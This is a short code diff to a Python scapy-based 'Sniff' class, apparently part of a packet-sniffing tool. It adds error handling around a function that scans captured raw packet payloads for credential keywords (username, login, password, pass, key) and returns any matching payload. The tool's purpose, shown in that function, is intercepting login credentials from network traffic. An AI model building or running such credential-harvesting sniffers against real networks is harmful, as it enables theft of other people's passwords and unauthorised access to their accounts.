@@ -19,12 +19,17 @@ class Sniff:
         return self.url
 
     def get_login_info(self, packet):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            self.keywords = ["username", "user", "login", "password", "pass", "key"]
-            for keyword in self.keywords:
-                if keyword in load:
-                    return load
+        try:
+            if packet.haslayer(scapy.Raw):
+                load = packet[scapy.Raw].load
+                self.keywords = ["username", "user", "login", "password", "pass", "key"]
+                for keyword in self.keywords:
+                    if keyword in load:
+                        return load
+
+        except Exception as e:
+            print(f'\n[-] ERROR: {e}')
+            sys.exit(0)
 
     def process_sniffed_packet(self, packet):
         try:
